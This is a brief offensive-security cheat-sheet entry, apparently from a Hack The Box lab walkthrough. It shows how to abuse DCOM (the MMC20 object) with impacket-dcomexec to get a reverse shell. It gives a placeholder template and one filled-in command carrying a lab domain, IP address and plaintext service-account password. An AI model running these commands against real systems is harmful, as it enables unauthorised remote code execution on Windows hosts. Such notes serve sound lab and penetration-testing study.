item.title: ExecuteDCOM
item.description:
Abuse #1: ExecuteDCOM

# Revshell
impacket-dcomexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' '<POWERSHELL_3_BASE64>' -silentcommand -object MMC20

$ impacket-dcomexec jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'powershell -e ' -silentcommand -object MMC20
